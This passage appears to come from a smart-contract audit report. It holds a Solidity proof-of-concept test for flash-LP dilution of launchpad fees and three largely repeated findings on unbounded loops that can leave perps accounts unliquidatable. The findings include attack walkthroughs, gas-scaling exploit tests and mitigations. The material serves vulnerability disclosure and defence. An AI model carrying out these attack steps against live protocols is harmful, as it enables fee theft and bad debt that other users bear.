        token0 = new MockERC20("T0", "T0");
        token1 = new MockERC20("T1", "T1");
        distributor = new MockDistributor();

        pair = new GTELaunchpadV2Pair(); // factory = address(this)
        pair.initialize(address(token0), address(token1), launchpadLp, address(distributor));

        // Mint large supplies to test
        token0.mint(address(this), 2_000_000e18);
        token1.mint(address(this), 2_000_000e18);

        // Seed initial liquidity to launchpadLp
        token0.transfer(address(pair), 1_000_000e18);
        token1.transfer(address(pair), 1_000_000e18);
        pair.mint(launchpadLp);
    }

    function _getAmountOut(uint256 amountIn, uint112 reserveIn, uint112 reserveOut) internal pure returns (uint256) {
        // Uniswap V2 formula with 0.3% fee (997/1000)
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * uint256(reserveOut);
        uint256 denominator = uint256(reserveIn) * 1000 + amountInWithFee;
        return numerator / denominator;
    }

    function test_LaunchpadFeeShareCanBeDilutedByFlashLP() public {
        uint256 amountIn = 10_000e18; // swap input

        // Baseline: direct swap without LP supply manipulation
        (uint112 fee0Before,,) = pair.getAccruedLaunchpadFees();
        {
            (uint112 r0, uint112 r1,) = pair.getReserves();
            uint256 out = _getAmountOut(amountIn, r0, r1);
            // Provide input then swap for output
            token0.transfer(address(pair), amountIn);
            pair.swap(0, out, address(this), "");
        }
        (uint112 fee0After,,) = pair.getAccruedLaunchpadFees();
        uint256 normalFee = uint256(fee0After) - uint256(fee0Before);
        assertGt(normalFee, 0, "baseline fee should accrue");

        // Attack: mint huge LP in same tx, then swap, then burn
        (uint112 fee0Before2,,) = pair.getAccruedLaunchpadFees();
        {
            // Inflate LP supply massively (proportional to reserves)
            (uint112 r0, uint112 r1,) = pair.getReserves();
            uint256 add0 = uint256(r0) * 100; // 100x reserves
            uint256 add1 = uint256(r1) * 100;
            // Ensure we have enough tokens; mint extra if needed
            token0.mint(address(this), add0);
            token1.mint(address(this), add1);
            token0.transfer(address(pair), add0);
            token1.transfer(address(pair), add1);
            pair.mint(address(this));

            // Now perform the same-sized input swap
            (r0, r1,) = pair.getReserves();
            uint256 out2 = _getAmountOut(amountIn, r0, r1);
            token0.transfer(address(pair), amountIn);
            pair.swap(0, out2, address(this), "");

            // Burn the temporary LP to exit
            uint256 lpBal = pair.balanceOf(address(this));
            pair.transfer(address(pair), lpBal);
            pair.burn(address(this));
        }
        (uint112 fee0After2,,) = pair.getAccruedLaunchpadFees();
        uint256 manipulatedFee = uint256(fee0After2) - uint256(fee0Before2);

        // The manipulated fee should be strictly less than baseline for the same input size
        assertLt(manipulatedFee, normalFee, "attacker reduces launchpad fee share");
    }
}


## Suggested Mitigation
Avoid computing the launchpad fee share from instantaneous LP totals that can be manipulated within a single transaction. Safer options:
- Fixed protocol fee: Route a fixed fraction of each swap to the Distributor, independent of LP distribution (i.e., treat it as a protocol fee rather than an LP-share-derived fee).
- Snapshot-based share: Maintain last-block snapshots of (launchpadLpBalance, totalSupply) and use those in _getLaunchpadFees. Update the snapshot only when blockTimestampLast advances inside _update, so same-tx mint/burn cannot affect the swap’s fee share.
- Time-weighted averaging: Track a TWAP of launchpadLpBal/totalSupply over multiple blocks and compute rewards based on the averaged ratio.
- Operational guard (last resort): Disallow mint/burn and swap in the same block (per-pair block guard), though this can harm UX and is less robust than state-snapshotting.

Prefer snapshot-based or fixed protocol fee designs, which fully eliminate same-transaction manipulability while preserving intended economics.





 **Derived From** : Perps account operations iterate over unbounded asset lists, enabling gas-based DoS

## [M-6]. Unbounded loops over per-account assets in ClearingHouse make undercollateralized accounts practically unliquidatable

### Finding Severity Justification: Unbounded iteration over per-account assets in core risk checks (isLiquidatable, rebalanceAccount, _getIntendedMarginAndUpnl, getUpnl, getIntendedMargin, getNotionalAccountValue) allows a user to grow their asset set arbitrarily (subject only to crossMarginEnabled). Liquidation paths and routine margin checks must loop over the full set, and with enough markets this can cause gas exhaustion and make an underwater account practically unliquidatable, risking bad debt. Impact can be high (bad debt/insolvency), but likelihood depends on how many markets are enabled with cross margin and typical lot sizes, hence Medium overall.
## Derived From Pattern/Invariant
Perps account operations iterate over unbounded asset lists, enabling gas-based DoS

## Exploit Type
GasGriefBlockLimit

## Location
ClearingHouseLib.isLiquidatable / rebalanceAccount / _getIntendedMarginAndUpnl / getUpnl / getIntendedMargin / getNotionalAccountValue

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The core risk and margin functions in `ClearingHouseLib` iterate over the full list of markets (`assets`) a subaccount has exposure to, with **no per-account cap** on the number of assets. The size of this set is user-controlled by opening dust positions across many markets.

Key locations:

* Fetching account state:
```solidity
function getAccount(ClearingHouse storage self, address account, uint256 subaccount)
    internal
    view
    returns (DynamicArrayLib.DynamicArray memory assets, Position[] memory positions)
{
    assets = self.assets[account][subaccount].values().wrap();
    positions = _getPositions(self, assets, account, subaccount, false);
}
```

* Liquidation check:
```solidity
function isLiquidatable(
    ClearingHouse storage self,
    DynamicArrayLib.DynamicArray memory assets,
    Position[] memory positions,
    int256 margin,
    BookType bookType
) internal view returns (bool liquidatable) {
    __LiquidatableCheckCache__ memory cache;
    for (uint256 i; i < assets.length(); ++i) {
        (cache.upnl, cache.minMargin) =
            self.market[assets.getBytes32(i)].getUpnlAndMinMargin(positions[i], bookType);
        cache.totalUpnl += cache.upnl;
        cache.totalMinMargin += cache.minMargin;
    }
    // compare margin + totalUpnl vs totalMinMargin
}
```

* Rebalancing margin on every trade:
```solidity
function rebalanceOpen(..., DynamicArrayLib.DynamicArray memory assets, Position[] memory positions, int256 margin, int256 marginDelta)
    internal
    view
    returns (int256 finalMargin, int256 finalMarginDelta)
{
    (uint256 intendedMargin, int256 upnl) = _getIntendedMarginAndUpnl(self, assets, positions);
    ...
}

function _getIntendedMarginAndUpnl(..., DynamicArrayLib.DynamicArray memory assets, Position[] memory positions)
    internal
    view
    returns (uint256 totalIntendedMargin, int256 totalUpnl)
{
    uint256 length = assets.length();
    for (uint256 i; i < length; ++i) {
        (uint256 intendedMargin, int256 upnl) = self.market[assets.getBytes32(i)].getIntendedMarginAndUpnl(positions[i]);
        totalIntendedMargin += intendedMargin;
        totalUpnl += upnl;
    }
}
```

* Similar unbounded loops exist in `getUpnl`, `getIntendedMargin`, `getNotionalAccountValue`, `hasBadDebt`, `assertPostWithdrawalMarginRequired`, etc.

The `assets` set for each `(account, subaccount)` is populated whenever the user opens their first position in a market:

```solidity
if (cache.isNewPosition) {
    if (!_assetCanBeAddedToAccount(cache.assets, makerResult.asset)) return true;
    cache.assets.p(makerResult.asset);
}
...
self.setAssets(account, subaccount, assets.length(), tradedAsset);
```

The only constraint on whether a new asset can be added is that **all involved markets have `crossMarginEnabled = true`**. There is no explicit limit on the number of assets per subaccount:

```solidity
function _assetCanBeAddedToAccount(DynamicArrayLib.DynamicArray memory assets, bytes32 asset)
    private
    view
    returns (bool canBeAdded)
{
    uint256 numPositions = assets.length();
    if (numPositions == 0) return true;
    if (assets.contains(asset)) return true;
    if (!StorageLib.loadMarketSettings(asset).crossMarginEnabled) return false;
    for (uint256 i; i < numPositions; ++i) {
        if (!StorageLib.loadMarketSettings(assets.getBytes32(i)).crossMarginEnabled) return false;
    }
    return true;
}
```

As the protocol onboards more markets with `crossMarginEnabled = true`, a malicious user can:

1. Open **dust-sized positions** (e.g., tiny longs/shorts far from useful sizes) on as many listed markets as possible, so that `assets.length()` for their subaccount grows into the hundreds or thousands.
2. Ensure at least one of their positions is significantly undercollateralized, so their subaccount **should** be liquidatable and might accumulate bad debt.
3. When a keeper or liquidator calls into liquidation or trading flows that need to evaluate this account, functions like `isLiquidatable` and `rebalanceAccount` must iterate over the full `assets` array and call into each market for PnL and margin computations.
4. At some scale of `assets.length()`, these loops will **exceed the block gas limit** or realistic gas budgets for keepers/liquidators, causing calls to revert OOG. This makes:
   * `LiquidatorPanel`'s liquidation operations fail for this account.
   * Margin updates and leverage changes on this subaccount unsafe or impossible.

Because liquidation logic depends on these unbounded loops, the attacker can create an account that is **theoretically liquidatable but practically unliquidatable** due to gas exhaustion, allowing bad debt to accumulate unchallenged.

The cost for the attacker is low: each dust position can be much smaller than the cost imposed on every future risk/margin check for that account, and the system offers no configuration parameter to cap `assets.length()` for a subaccount.


## Impact
Because ClearingHouseLib relies on full-account scans of the per-subaccount assets set for core risk checks (isLiquidatable, rebalanceAccount via _getIntendedMarginAndUpnl, assertPostWithdrawalMarginRequired, etc.), a user can bloat this set by opening dust positions across many markets where crossMarginEnabled is true. Liquidation and margin updates are gated by these global scans, so beyond a certain assets.length() threshold, transactions that should liquidate an underwater account will run out of gas or be uneconomical. This turns a theoretically liquidatable account into a practically unliquidatable one and can allow bad debt to persist if the insurance fund is insufficient, degrading solvency and harming other users.

## Command to Run Test


## Proof of Concept
Setup: Governance gradually enables multiple markets with crossMarginEnabled = true. An attacker does the following on a chosen subaccount S:

1) For each enabled market Mi, open a minimal-amount position (dust) so that Mi is added to the assets set for (attacker, S). This is admitted by _assetCanBeAddedToAccount() as long as all assets are crossMarginEnabled.
2) Ensure S is underwater (e.g., open an oversized leveraged position on one market then withdraw free collateral to push equity below maintenance).
3) When a liquidator tries to liquidate S, the liquidation flow (via LiquidatorPanel) first computes risk and liquidatability by calling ClearingHouseLib.getAccountAndMargin() and ClearingHouseLib.isLiquidatable(...). Both allocate arrays sized at assets.length() and then loop over all markets, calling Market.getUpnlAndMinMargin() per asset.
4) As assets.length() grows into the hundreds/thousands, the risk/scan loops become too expensive and revert or become non-economical, preventing liquidation and allowing the undercollateralized account to remain unliquidated.

Key code paths:
- getAccount(): assets = self.assets[account][subaccount].values().wrap(); then _getPositions(self, assets, ...)
- isLiquidatable(...): for each asset i: self.market[assets.getBytes32(i)].getUpnlAndMinMargin(...)
- rebalanceAccount -> _getIntendedMarginAndUpnl(...): for each asset i: getIntendedMarginAndUpnl(...)

No per-account cap exists on the number of assets; only crossMarginEnabled is checked. Thus the attacker controls assets.length() and can cause gas-based DoS of liquidation/risk checks.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";

/// This test demonstrates that the cost of an isLiquidatable-style loop
/// grows linearly with the number of assets, which an attacker can inflate
/// by opening dust positions across many cross-margin-enabled markets.
contract ClearingHouseGasScalingTest is Test {
    struct Position { bool isLong; uint256 amount; uint256 openNotional; uint256 leverage; int256 lastCumulativeFunding; }

    // Stand-in for market.getUpnlAndMinMargin that does a small amount of work per asset.
    function _getUpnlAndMinMargin(Position memory) internal pure returns (int256 upnl, uint256 mm) {
        // Simulate storage/compute per asset; keep deterministic and small.
        unchecked {
            int256 sum;
            uint256 acc;
            for (uint256 i = 0; i < 16; ++i) {
                sum += int256(int8(1));
                acc += 1;
            }
            return (sum, acc);
        }
    }

    // Simplified version of ClearingHouseLib.isLiquidatable()
    function _isLiquidatable(bytes32[] memory assets, Position[] memory positions, int256 margin) internal pure returns (bool) {
        int256 totalUpnl;
        uint256 totalMinMargin;
        for (uint256 i = 0; i < assets.length; ++i) {
            (int256 upnl, uint256 mm) = _getUpnlAndMinMargin(positions[i]);
            totalUpnl += upnl;
            totalMinMargin += mm;
        }
        // liquidatable if margin + UPNL below total min margin
        return margin + totalUpnl < int256(totalMinMargin);
    }

    function _build(uint256 n) internal pure returns (bytes32[] memory assets, Position[] memory positions) {
        assets = new bytes32[](n);
        positions = new Position[](n);
        for (uint256 i = 0; i < n; ++i) {
            assets[i] = bytes32(uint256(i + 1));
            positions[i] = Position({isLong: true, amount: 1, openNotional: 1, leverage: 1e18, lastCumulativeFunding: 0});
        }
    }

    function testGasScalesWithNumAssets() public {
        // Compare gas usage for different assets.length().
        (bytes32[] memory aSmall, Position[] memory pSmall) = _build(64);
        (bytes32[] memory aBig, Position[] memory pBig) = _build(256);

        uint256 g1 = gasleft();
        bool l1 = _isLiquidatable(aSmall, pSmall, 0);
        l1; // silence
        uint256 gasAfterSmall = gasleft();
        uint256 smallUsed = g1 - gasAfterSmall;

        uint256 g2 = gasleft();
        bool l2 = _isLiquidatable(aBig, pBig, 0);
        l2; // silence
        uint256 gasAfterBig = gasleft();
        uint256 bigUsed = g2 - gasAfterBig;

        // Expect near-linear scaling: with 4x assets, gas should be >~ 3x of small
        // (tolerant bound to avoid flakiness across toolchains)
        assertGt(bigUsed, smallUsed * 3 / 2);
    }
}


## Suggested Mitigation
Short-term, enforce a hard cap on the number of cross-margin markets per subaccount and reject new asset additions beyond it:

- Add a config parameter (e.g., maxAssetsPerSubaccount) stored in ClearingHouse or MarketSettings.
- Enforce in _assetCanBeAddedToAccount():
  if (assets.length() >= maxAssetsPerSubaccount) return false;

Medium-term, remove hot-path full scans by maintaining per-subaccount aggregate risk caches:
- Track and persist per-subaccount totals: totalIntendedMargin, totalMaintenanceMargin, totalNotional, totalUpnl (or enough to recompute deterministically), updating only the touched asset on each trade/funding.
- Then isLiquidatable and rebalanceAccount become O(1) in the number of assets.

Operationally, add guardrails:
- Monitor accounts with large assets.length() and pre-emptively restrict further openings or require higher min sizes.
- Allow liquidations to operate on subsets of assets without a global cross-asset pre-check (with careful accounting), or provide a paginated liquidation that updates/consumes cached aggregate risk.

Combining a reasonable hard cap (e.g., 8–16 assets) with incremental risk accounting eliminates the gas-based DoS while keeping cross-margin benefits.


## [M-7]. Unbounded iteration over perps positions in ClearingHouseLib can make undercollateralized accounts unliquidatable

### Finding Severity Justification: Core liquidation and risk checks iterate over a per-account DynamicArray of assets with no per-subaccount cap. An attacker can open minimal positions across many markets (subject only to markets listed and crossMarginEnabled) to inflate assets.length(). This raises gas costs linearly for isLiquidatable, rebalanceAccount, getIntendedMargin, etc., potentially making liquidations economically infeasible or even out-of-gas, which can allow undercollateralized accounts to persist and create bad debt. Impact is high (solvency risk), but likelihood depends on the number of listed markets and is thus moderate, yielding a Medium severity.
## Derived From Pattern/Invariant
Perps account operations iterate over unbounded asset lists, enabling gas-based DoS

## Exploit Type
Dos

## Location
ClearingHouseLib.isLiquidatable

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: The impact hinges on how many cross-margin markets are listed and practical gas limits on MegaETH. The code clearly lacks a per-account cap and loops linearly, but whether it reaches block gas limits is environment-dependent. Hence, while the root cause is real, exploit practicality could vary.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Core perps risk and margin functions iterate over the full set of markets (`assets`) a subaccount has exposure to, with no explicit cap on the number of markets per subaccount. An attacker can open dust-sized positions in many markets, inflating `assets.length`, and thereby drive gas consumption in liquidation and margin paths up to or beyond block limits, making their account practically unliquidatable.

Key functions with unbounded loops:
```solidity
function getAccount(ClearingHouse storage self, address account, uint256 subaccount)
    internal
    view
    returns (DynamicArrayLib.DynamicArray memory assets, Position[] memory positions)
{
    assets = self.assets[account][subaccount].values().wrap();
    positions = _getPositions(self, assets, account, subaccount, false);
}

function isLiquidatable(
    ClearingHouse storage self,
    DynamicArrayLib.DynamicArray memory assets,
    Position[] memory positions,
    int256 margin,
    BookType bookType
) internal view returns (bool liquidatable) {
    __LiquidatableCheckCache__ memory cache;
    for (uint256 i; i < assets.length(); ++i) {
        (cache.upnl, cache.minMargin) =
            self.market[assets.getBytes32(i)].getUpnlAndMinMargin(positions[i], bookType);
        cache.totalUpnl += cache.upnl;
        cache.totalMinMargin += cache.minMargin;
    }
    ...
}

function _getIntendedMarginAndUpnl(
    ClearingHouse storage self,
    DynamicArrayLib.DynamicArray memory assets,
    Position[] memory positions
) internal view returns (uint256 totalIntendedMargin, int256 totalUpnl) {
    uint256 length = assets.length();
    uint256 intendedMargin;
    int256 upnl;
    for (uint256 i; i < length; ++i) {
        (intendedMargin, upnl) = self.market[assets.getBytes32(i)].getIntendedMarginAndUpnl(positions[i]);
        totalIntendedMargin += intendedMargin;
        totalUpnl += upnl;
    }
}

function rebalanceAccount(...)
    internal
    view
    returns (int256 finalMargin, int256 finalMarginDelta)
{
    if (marginDelta >= 0) {
        return self.rebalanceOpen({assets: assets, positions: positions, margin: margin, marginDelta: marginDelta});
    } else {
        return self.rebalanceClose({assets: assets, positions: positions, margin: margin, marginDelta: marginDelta});
    }
}

function rebalanceOpen(...)
    internal
    view
    returns (int256 finalMargin, int256 finalMarginDelta)
{
    (uint256 intendedMargin, int256 upnl) = _getIntendedMarginAndUpnl(self, assets, positions);
    ...
}

function hasBadDebt(...)
    internal
    view
    returns (bool badDebt) {
    int256 upnl;
    for (uint256 i; i < positions.length; ++i) {
        upnl += self.market[assets.getBytes32(i)].getUpnl(positions[i]);
    }
    return margin + upnl < 0;
}
```

The per-account `assets` set is user-controlled:
```solidity
// ClearingHouseLib.updateAccount
self.setAssets(account, subaccount, assets.length(), tradedAsset);
...
function setAssets(..., uint256 newLength, bytes32 asset) internal {
    uint256 oldLength = self.assets[account][subaccount].length();
    if (oldLength < newLength) self.assets[account][subaccount].add(asset);
    else self.assets[account][subaccount].remove(asset);
}
```

There is no per-subaccount limit, only the global number of markets in the system. An attacker can:
- For each enabled perps market, open a tiny position (e.g., 1 wei base) to cause that asset to be added to `self.assets[account][subaccount]`.
- Repeat this pattern as new markets are listed, accumulating a very large `assets.length()`.

Then, when:
- A liquidator (with `LIQUIDATOR_ROLE`) tries to liquidate the account, or
- Any user (or keeper) calls a function that relies on `isLiquidatable`, `rebalanceAccount`, `getIntendedMargin`, `hasBadDebt`, etc.,

all of these operations require iterating across the attacker-controlled `assets` list, making gas cost scale linearly with the number of markets. On-chain, `assets.length` can grow until these loops approach or exceed the block gas limit, at which point:
- `isLiquidatable` calls may revert or become economically infeasible.
- Liquidation/ADL/deleverage flows that depend on these checks cannot execute.

This violates the protocol’s invariant that undercollateralized positions can always be timely liquidated to protect system solvency. Even if it does not yet reach the hard block limit, an attacker can raise gas enough that rational liquidators will not target that account, allowing it to accumulate bad debt.

## Impact
Because per-subaccount assets are unbounded and user-controlled, an attacker can open dust positions across many crossMarginEnabled markets to inflate assets.length(). All core risk functions iterate this set (e.g., isLiquidatable, rebalanceAccount, getIntendedMargin, hasBadDebt), making their gas costs attacker-controlled and linear in the number of markets. This can render liquidations and other margin/risk operations economically infeasible or even out-of-gas, allowing undercollateralized accounts to persist and create bad debt. Severity is medium: solvency risk is real while likelihood scales with the number of listed markets.

## Command to Run Test


## Proof of Concept
Exploit outline:

1) Preconditions: Many perps markets are listed and crossMarginEnabled.
2) The attacker funds a subaccount with minimal collateral and opens tiny positions (e.g., 1 wei base) in as many markets as possible. Each filled trade causes the market’s bytes32 asset id to be added to self.assets[attacker][subaccount]. There is no per-subaccount cap.
3) After inflating assets.length across dozens/hundreds of markets, the attacker takes a directional leveraged position to push their account close to or below maintenance.
4) Any liquidation or risk check now calls ClearingHouseLib.isLiquidatable and related paths, looping once per asset: for (uint256 i; i < assets.length(); ++i) { (upnl, minMargin) = self.market[asset].getUpnlAndMinMargin(...); ... }
5) As assets.length grows, these loops become prohibitively expensive. Liquidators either revert due to OOG or refuse to target the account due to non-economic gas costs, letting a negative-equity account persist and potentially creating bad debt.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {ClearingHouse, ClearingHouseLib} from "contracts/perps/types/ClearingHouse.sol";
import {Position} from "contracts/perps/types/Position.sol";
import {BookType} from "contracts/perps/types/Enums.sol";
import {DynamicArrayLib} from "solady/utils/DynamicArrayLib.sol";

contract CHHarness {
    using ClearingHouseLib for ClearingHouse;

    ClearingHouse internal s;

    // Seed minimal per-asset markPrice so MarketLib.getUpnlAndMinMargin can run cheaply.
    function seedAssets(bytes32[] memory assets, uint256 markPrice) external {
        for (uint256 i; i < assets.length; ++i) {
            s.market[assets[i]].markPrice = markPrice;
        }
    }

    // Executes isLiquidatable over an arbitrary set of assets and returns gas used.
    function gasIsLiquidatable(bytes32[] memory assets)
        external
        returns (uint256 used, bool liq)
    {
        DynamicArrayLib.DynamicArray memory da = DynamicArrayLib.wrap(assets);
        Position[] memory positions = new Position[](assets.length);
        for (uint256 i; i < assets.length; ++i) {
            // Tiny non-zero positions force per-asset computations in the loop.
            positions[i].amount = 1;
            positions[i].leverage = 1e18;
            positions[i].isLong = true;
        }
        uint256 g0 = gasleft();
        liq = s.isLiquidatable(da, positions, 0, BookType.STANDARD);
        used = g0 - gasleft();
    }
}

contract PerpsUnboundedIterationTest is Test {
    CHHarness internal h;

    function setUp() public {
        h = new CHHarness();
    }

    function _mkAssets(uint256 n) internal pure returns (bytes32[] memory a) {
        a = new bytes32[](n);
        for (uint256 i; i < n; ++i) {
            a[i] = bytes32(uint256(keccak256(abi.encodePacked(i + 1))));
        }
    }

    function test_gas_scales_with_assets_length() public {
        // 10 assets
        bytes32[] memory a10 = _mkAssets(10);
        h.seedAssets(a10, 1e18);
        (uint256 g10,) = h.gasIsLiquidatable(a10);

        // 100 assets
        bytes32[] memory a100 = _mkAssets(100);
        h.seedAssets(a100, 1e18);
        (uint256 g100,) = h.gasIsLiquidatable(a100);

        // 200 assets
        bytes32[] memory a200 = _mkAssets(200);
        h.seedAssets(a200, 1e18);
        (uint256 g200,) = h.gasIsLiquidatable(a200);

        // Monotonic increase demonstrates attacker-controlled gas growth.
        assertGt(g100, g10, "gas should increase with more assets");
        assertGt(g200, g100, "gas should increase with more assets");

        emit log_named_uint("gas_10", g10);
        emit log_named_uint("gas_100", g100);
        emit log_named_uint("gas_200", g200);
    }
}


## Suggested Mitigation
A combination of caps and bounded evaluation is recommended:

1) Hard-cap markets per subaccount: introduce a config param maxAssetsPerSubaccount and enforce it where assets are added (in _assetCanBeAddedToAccount or before updateAccount). If assets.length() >= cap and the new asset is not already present, revert the trade.

2) Bounded liquidation/risk evaluation: redesign isLiquidatable and friends to avoid O(N) per-call loops over attacker-controlled lists. Options include:
   - Maintain per-subaccount aggregated values updated incrementally on each trade (e.g., totalNotional, totalIntendedMargin). At liquidate-time, compute minMargin using cached totals and current per-asset ratios if needed. This avoids iterating every position when only a macro check is required.
   - Implement paged or chunked liquidation checks with stateful progress so each tx processes a bounded number of assets, and liquidations can proceed over multiple calls if needed.

3) Economic incentives: if full redesign is not immediate, add an emergency path that uses a stricter backstop bookType requiring fewer iterations or applies a coarse global maintenance ratio computed from cached aggregates, preventing OOG while maintaining safety.

Enforcing a strict per-subaccount asset cap provides an immediate, simple guardrail. Combining it with cached aggregates or paginated checks prevents gas-based DoS even when the protocol eventually lists many markets.


## [M-8]. Unbounded per-account asset loops in ClearingHouseLib allow a user to make their account practically unliquidatable

### Finding Severity Justification: Liquidation and core margin checks iterate over a per-account assets set with no explicit cap. A trader can open dust positions across many cross‑margin enabled markets, forcing isLiquidatable and margin rebalancing to loop over all assets. This increases gas linearly and can make liquidation attempts uneconomical or fail due to gas limits, risking delayed liquidation and potential bad debt. Impact is real (risk engine availability and potential insolvency), but exploitation depends on the number of listed markets and admin configuration, so it is not guaranteed to always reach OOG in production.
## Derived From Pattern/Invariant
Perps account operations iterate over unbounded asset lists, enabling gas-based DoS

## Exploit Type
Dos

## Location
ClearingHouseLib.isLiquidatable / _getIntendedMarginAndUpnl (and other getters looping over assets)

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: The attack path is clear from code, but the exact gas breakpoints depend on deployment parameters (number of markets, lot sizes, L2 gas limits) and LiquidatorPanel’s exact flow (not fully included). While the DoS risk is credible, the extent (OOG vs merely expensive) is environment-dependent.
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Several critical risk and lifecycle functions in `ClearingHouseLib` iterate over the full set of assets (`EnumerableSet` of `bytes32`) for a given `(account, subaccount)` without any explicit bound per account. The size of this asset set is user-controlled: a trader can open tiny positions on many markets (all with `crossMarginEnabled = true`), inflating `assets.length` until liquidation and margin functions become too gas-expensive to execute.

Key locations:

```solidity
function getAccount(ClearingHouse storage self, address account, uint256 subaccount)
    internal
    view
    returns (DynamicArrayLib.DynamicArray memory assets, Position[] memory positions)
{
    assets = self.assets[account][subaccount].values().wrap();
    positions = _getPositions(self, assets, account, subaccount, false);
}

function isLiquidatable(
    ClearingHouse storage self,
    DynamicArrayLib.DynamicArray memory assets,
    Position[] memory positions,
    int256 margin,
    BookType bookType
) internal view returns (bool liquidatable) {
    __LiquidatableCheckCache__ memory cache;
    for (uint256 i; i < assets.length(); ++i) {
        (cache.upnl, cache.minMargin) =
            self.market[assets.getBytes32(i)].getUpnlAndMinMargin(positions[i], bookType);

        cache.totalUpnl += cache.upnl;
        cache.totalMinMargin += cache.minMargin;
    }
    ...
}

function _getIntendedMarginAndUpnl(
    ClearingHouse storage self,
    DynamicArrayLib.DynamicArray memory assets,
    Position[] memory positions
) internal view returns (uint256 totalIntendedMargin, int256 totalUpnl) {
    uint256 length = assets.length();
    for (uint256 i; i < length; ++i) {
        (intendedMargin, upnl) = self.market[assets.getBytes32(i)].getIntendedMarginAndUpnl(positions[i]);
        totalIntendedMargin += intendedMargin;
        totalUpnl += upnl;
    }
}

function hasBadDebt(
    ClearingHouse storage self,
    DynamicArrayLib.DynamicArray memory assets,
    Position[] memory positions,
    int256 margin
) internal view returns (bool badDebt) {
    int256 upnl;
    for (uint256 i; i < positions.length; ++i) {
        upnl += self.market[assets.getBytes32(i)].getUpnl(positions[i]);
    }
    return margin + upnl < 0;
}
```

These loops are directly used in:

* `isLiquidatable` – to decide whether a liquidation can be executed.
* `rebalanceAccount` (open/close) – called on every trade to adjust margin:
  ```solidity
  (uint256 intendedMargin, int256 upnl) = _getIntendedMarginAndUpnl(self, assets, positions);
  ```
* `assertPostWithdrawalMarginRequired` – for margin withdrawals.
* `assertOpenMarginRequired` – for leverage updates.

Crucially, there is **no cap** on the number of markets a single subaccount can be exposed to, aside from the global number of markets listed by Admin. Since many markets can enable `crossMarginEnabled = true`, a malicious user can:

1. Deposit a moderate amount of collateral.
2. Open **dust-sized** positions (e.g. 1 wei notional) across as many perp markets as exist, just enough to be added to `self.assets[account][subaccount]` via:
   ```solidity
   self.assets[account][subaccount].add(asset);
   ```
3. Each subsequent liquidation attempt, margin check, or leverage/margin adjustment on that subaccount must now iterate over `assets.length()` entries to compute total UPNL and margin requirements.
4. With a sufficiently large `assets.length()` (across tens or hundreds of markets), the gas cost for `isLiquidatable` and related internal calls can approach or exceed the block gas limit. Liquidation transactions (from `LiquidatorPanel`) or even normal user actions that entail these checks will revert OOG or be uneconomical to run.

The effect is **gas-based denial-of-service** on that account’s risk management:

* If the attacker then turns one of their positions large and underwater, the system may be unable to liquidate it because `isLiquidatable` / `rebalanceAccount` cannot complete within gas limits.
* Insurance fund and other users bear the ensuing bad debt since the position cannot be quickly closed.

Because the number of markets is expected to grow over time, this vulnerability worsens as protocol adoption increases. It also does not require any privileged access: any trader can open many small positions to inflate their own `assets` set size.

## Impact
Because liquidation checks, margin assertions, and other risk functions iterate over the per-subaccount asset set without any explicit cap, an attacker can open dust-sized positions across many cross-margin-enabled markets to bloat assets.length(). This makes calls like isLiquidatable, assertPostWithdrawalMarginRequired, and rebalancing increasingly expensive and eventually uneconomical or prone to OOG. A large, underwater position on one market can then become practically unliquidatable, delaying deleveraging and potentially creating bad debt absorbed by the insurance fund. The severity grows with number of listed markets and any market configuration that enables cross-margin.

## Command to Run Test


## Proof of Concept
Revised scenario:

1) Admin lists many perps markets with crossMarginEnabled = true and ACTIVE status. 2) The attacker deposits some collateral and opens 1 wei (or dust) positions across N distinct markets, which does two things: (a) adds those markets into the attacker’s assets set (self.assets[attacker][sub].add(asset)), and (b) stores minimal Position structs in each Market.position mapping. 3) Now, liquidation checks for that subaccount must iterate over all N assets and compute UPNL and minMargin per market (isLiquidatable -> getUpnlAndMinMargin loop). 4) For sufficiently large N, the gas cost becomes linearly large; liquidations and margin checks become uneconomical or fail due to block gas/limits. 5) The attacker then enlarges one position and lets it go underwater; liquidators cannot liquidate timely due to gas constraints, risking bad debt for the protocol.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {ClearingHouse, ClearingHouseLib} from "contracts/perps/types/ClearingHouse.sol";
import {StorageLib} from "contracts/perps/types/StorageLib.sol";
import {Market, MarketLib, MarketSettings} from "contracts/perps/types/Market.sol";
import {FundingRateSettings} from "contracts/perps/types/FundingRateEngine.sol";
import {Position} from "contracts/perps/types/Position.sol";
import {BookType, Status} from "contracts/perps/types/Enums.sol";
import {DynamicArrayLib} from "@solady/utils/DynamicArrayLib.sol";
import {EnumerableSetLib} from "@solady/utils/EnumerableSetLib.sol";

contract GasLoopTest is Test {
    using ClearingHouseLib for ClearingHouse;
    using MarketLib for Market;
    using EnumerableSetLib for EnumerableSetLib.Bytes32Set;

    function _setupMarkets(address acct, uint256 sub, uint256 n) internal {
        ClearingHouse storage ch = StorageLib.loadClearingHouse();
        for (uint256 i; i < n; ++i) {
            bytes32 asset = bytes32(uint256(keccak256(abi.encode("ASSET", i))));
            Market storage m = ch.market[asset];

            MarketSettings memory ms;
            ms.status = Status.ACTIVE;
            ms.crossMarginEnabled = true;
            ms.maxOpenLeverage = 10e18;
            ms.maintenanceMarginRatio = 5e16; // 5%
            ms.liquidationFeeRate = 0;
            ms.divergenceCap = 0;
            ms.reduceOnlyCap = 1000;
            ms.partialLiquidationThreshold = 0;
            ms.partialLiquidationRate = 1e18;

            FundingRateSettings memory fs;
            fs.fundingInterval = 1 hours;
            fs.resetInterval = 1 hours;
            fs.resetIterations = 1;
            fs.innerClamp = 1e15;
            fs.outerClamp = 1e15;
            fs.interestRate = 0;

            m.init(asset, ms, fs, 1e18);

            // Inflate the per-subaccount assets set and create a tiny open position
            ch.assets[acct][sub].add(asset);
            Position memory p = Position({
                isLong: true,
                amount: 1e18,
                openNotional: 1e18,
                leverage: 2e18,
                lastCumulativeFunding: 0
            });
